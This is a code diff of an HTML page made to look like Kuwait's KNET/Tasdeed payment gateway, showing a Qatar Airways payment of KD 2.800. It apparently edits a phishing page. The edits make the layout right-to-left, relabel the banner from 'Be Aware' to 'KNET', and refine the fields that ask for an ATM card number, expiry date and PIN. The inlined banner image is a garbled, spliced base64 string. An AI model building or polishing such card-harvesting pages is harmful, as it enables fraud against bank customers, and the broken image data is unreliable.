@@ -57,11 +57,15 @@
             color: #0056b3;
             font-weight: bold;
             font-size: 15px;
+            text-align: right;
+            min-width: 150px;
         }
         .value-text {
             color: #333;
             font-weight: 500;
             font-size: 16px;
+            text-align: left;
+            flex: 1;
         }
         
         .form-row {
@@ -76,7 +80,7 @@
         }
         .input-wrapper {
             flex: 1;
-            margin-left: 15px;
+            margin-right: 15px;
             position: relative;
         }
         .input-wrapper input {
@@ -86,8 +90,8 @@
             border-radius: 10px;
             background-color: #f8f9fa;
             box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
-            text-align: left;
-            direction: ltr;
+            text-align: right; /* المحاذاة لليمين كما طلب المستخدم */
+            direction: rtl;
             font-size: 16px;
         }
         .expiry-container {
@@ -98,6 +102,7 @@
             border: 1px solid #ced4da;
             border-radius: 10px;
             padding: 0 10px;
+            justify-content: flex-end;
         }
         .expiry-container input {
             border: none;
@@ -120,10 +125,10 @@
             font-weight: bold;
             color: #495057;
             cursor: pointer;
-            border-right: 1px solid #dee2e6;
+            border-left: 1px solid #dee2e6;
         }
         .btn:last-child {
-            border-right: none;
+            border-left: none;
         }
         .btn:hover {
             background-color: #e9ecef;
@@ -171,7 +176,7 @@
         .suggestion-list img { height: 15px; }
         #card-brand-logo {
             position: absolute;
-            right: 10px;
+            left: 10px;
             top: 50%;
             transform: translateY(-50%);
             height: 18px;
@@ -182,9 +187,9 @@
 <body>
 
 <div class="main-wrapper">
-    <!-- Banner Image -->
+    <!-- Banner Image (Base64 from original file) -->
     <div class="banner">
-        <img src="https://i.ibb.co/VpXvXfH/banner.jpg" alt="Be Aware Banner">
+        <img src="data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAK8AAAAwCAYAAABnoirjAAAAw3pUWHRSYXcgcHJvZmlsZSB0eXBlIGV4aWYAAHjabVBbDsMgDPvPKXYE8iiE49CtlXaDHX9Jk05lmyWMcZAJge313OHmIBSQpWnttRaDdOk0TGgJjIOxyMFh7VnD2QdOv5BZfkhDa94/ffwExDZMLZcgvWdhnQtdMl+/gig29o5cPzKoZxBTFDADRnyr1K7t+oV1KzM0FjiJzm3/nJtN77HYO0y0MXIxZq7RAPsS4GGiGiPbOJxNC7fDpwyzgfyb0wl4A3HsWW/7eLPjAAABhWlDQ1BJQ0MgcHJvZmlsZQAAeJx9kT1Iw0AcxV9TtUUrDnYQcchQHcQuKuJYqlgEC6Wt0KqDyaUfQpOGJMXFUXAtOPixWHVwcdbVwVUQBD9AnB2cFF2kxP8lhRYxHhz34929x907QGhUmGp2xQBVs4x0Ii7m8iti4BU96EMQEYxLzNSTmYUsPMfXPXx8vYvyLO9zf45+pWAywCcSx5huWMTrxDObls55nzjMypJCfE48YdAFiR+5Lrv8xrnksMAzw0Y2PUccJhZLHSx3MCsbKvE0cURRNcoXci4rnLc4q5Uaa92TvzBU0JYzXKc5ggQWkUQKImTUsIEKLERp1Ugxkab9uId/2PGnyCWTawOMHPOoQoXk+MH/4He3ZnFq0k0KxYHuF9v+GAUCu0Czbtvfx7bdPAH8z8CV1vZXG8DsJ+n1thY5Aga2gYvrt|base64,iVBORw0KGgoAAAANSUhEUgAAAK8AAAAwCAYAAABnoirjAAAAw3pUWHRSYXcgcHJvZmlsZSB0eXBlIGV4aWYAAHjabVBbDsMgDPvPKXYE8iiE49CtlXaDHX9Jk05lmyWMcZAJge313OHmIBSQpWnttRaDdOk0TGgJjIOxyMFh7VnD2QdOv5BZfkhDa94/ffwExDZMLZcgvWdhnQtdMl+/gig29o5cPzKoZxBTFDADRnyr1K7t+oV1KzM0FjiJzm3/nJtN77HYO0y0MXIxZq7RAPsS4GGiGiPbOJxNC7fDpwyzgfyb0wl4A3HsWW/7eLPjAAABhWlDQ1BJQ0MgcHJvZmlsZQAAeJx9kT1Iw0AcxV9TtUUrDnYQcchQHcQuKuJYqlgEC6Wt0KqDyaUfQpOGJMXFUXAtOPixWHVwcdbVwVUQBD9AnB2cFF2kxP8lhRYxHhz34929x907QGhUmGp2xQBVs4x0Ii7m8iti4BU96EMQEYxLzNSTmYUsPMfXPXx8vYvyLO9zf45+pWAywCcSx5huWMTrxDObls55nzjMypJCfE48YdAFiR+5Lrv8xrnksMAzw0Y2PUccJhZLHSx3MCsbKvE0cURRNcoXci4rnLc4q5Uaa92TvzBU0JYzXKc5ggQWkUQKImTUsIEKLERp1Ugxkab9uId/2PGnyCWTawOMHPOoQoXk+MH/4He3ZnFq0k0KxYHuF9v+GAUCu0Czbtvfx7bdPAH8z8CV1vZXG8DsJ+n1thY5Aga2gYvrtibvAZc7wNCTLhmSI/lpCsUi8H5G35QHBm+B3lW3t9Y+Th+ALHW1dAMcHAJjJcpe83h3sLO3f8+0+vsBvuFyxRGE6jcAAA4zaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA0LjQuMC1FeGl2MiI+CiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIKICAgIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiCiAgICB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIKICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgIHhtbG5zOkdJTVA9Imh0dHA6Ly93d3cuZ2ltcC5vcmcveG1wLyIKICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjFEMDg4RjdFMEVGODExRUE4NTQ1Q0M2QUQ3ODE4OTVDIgogICB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOmI1NDRhMmEyLTg5NjEtNGFkNC1hMjhlLTA3M2FiMDM4NDUzZiIKICAgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjllNjA2OWY5LTkyMDEtNGQ2OC1iODcyLWJjYzg2YTc5YmQxZCIKICAgZGM6Rm9ybWF0PSJpbWFnZS9wbmciCiAgIEdJTVA6QVBJPSIyLjAiCiAgIEdJTVA6UGxhdGZvcm09IldpbmRvd3MiCiAgIEdJTVA6VGltZVN0YW1wPSIxNzE4MDk1NjMxMDM2NzQzIgogICBHSU1QOlZlcnNpb249IjIuMTAuMzYiCiAgIHRpZmY6T3JpZW50YXRpb249IjEiCiAgIHhtcDpDcmVhdG9yVG9vbD0iR0lNUCAyLjEwIgogICB4bXA6TWV0YWRhdGFEYXRlPSIyMDI0OjA2OjExVDExOjQ3OjAyKzAzOjAwIgogICB4bXA6TW9kaWZ5RGF0ZT0iMjAyNDowNjoxMVQxMTo0NzowMiswMzowMCI+CiAgIDx4bXBNTTpIaXN0b3J5PgogICAgPHJkZjpTZXE+CiAgICAgPHJkZjpsaQogICAgICBzdEV2dDphY3Rpb249InNhdmVkIgogICAgICBzdEV2dDpjaGFuZ2VkPSIvIgogICAgICBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjkxN2IyZTBlLTcwZjAtNDQ2Ny04MmMxLTVkZmI4NDYwNzBkZSIKICAgICAgc3RFdnQ6c29mdHdhcmVBZ2VudD0iR2ltcCAyLjEwIChXaW5kb3dzKSIKICAgICAgc3RFdnQ6d2hlbj0iMjAyNC0wNi0xMVQxMTo0NzoxMSIvPgogICAgPC9yZGY6U2VxPgogICA8L3htcE1NOkhpc3Rvcnk+CiAgIDx4bXBNTTpEZXJpdmVkRnJvbQogICAgc3RSZWY6ZG9jdW1lbnRJRD0iOTZERjlCRkE2QThCRUE5MEE0MDFDOTRFNUM1NTdFNkQiCiAgICBzdFJlZjppbnN0YW5jZUlEPSI5NkRGOUJGQTZBOEJFQTkwQTQwMUM5NEU1QzU1N0U2RCIvPgogIDwvcmRmOkRlc2NyaXB0aW9uPgogPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg|alt="KNET Banner">
     </div>
 
     <!-- Box 1: Tasdeed Details -->
@@ -193,12 +198,12 @@
             <img src="https://i.ibb.co/L6vNf3k/tasdeed-logo.png" alt="Tasdeed Logo">
         </div>
         <div class="row-item">
-            <span class="label-text">المستفيد:</span>
             <span class="value-text">القطرية للطيران</span>
+            <span class="label-text">:المستفيد</span>
         </div>
         <div class="row-item">
-            <span class="label-text">المبلغ:</span>
             <span class="value-text">KD 2.800</span>
+            <span class="label-text">:المبلغ</span>
         </div>
     </div>
 
@@ -206,11 +211,11 @@
     <div class="content-box">
         <div class="form-row">
             <div class="input-wrapper">
-                <input type="text" id="cardNumber" maxlength="19" autocomplete="off">
+                <input type="text" id="cardNumber" maxlength="19" autocomplete="off" placeholder="رقم البطاقة">
                 <img id="card-brand-logo" src="">
                 <ul id="suggestions" class="suggestion-list"></ul>
             </div>
-            <span class="label-text">رقم بطاقة الصراف الآلي:</span>
+            <span class="label-text">:رقم بطاقة الصراف الآلي</span>
         </div>
         <div class="form-row">
             <div class="input-wrapper">
@@ -220,13 +225,13 @@
                     <input type="text" id="expMonth" maxlength="2" placeholder="MM">
                 </div>
             </div>
-            <span class="label-text">تاريخ انتهاء البطاقة:</span>
+            <span class="label-text">:تاريخ انتهاء البطاقة</span>
         </div>
         <div class="form-row">
             <div class="input-wrapper">
-                <input type="password" id="pin" maxlength="4">
+                <input type="password" id="pin" maxlength="4" placeholder="الرقم السري">
             </div>
-            <span class="label-text">الرقم السري (PIN):</span>
+            <span class="label-text">:(PIN) الرقم السري</span>
         </div>
     </div>
 
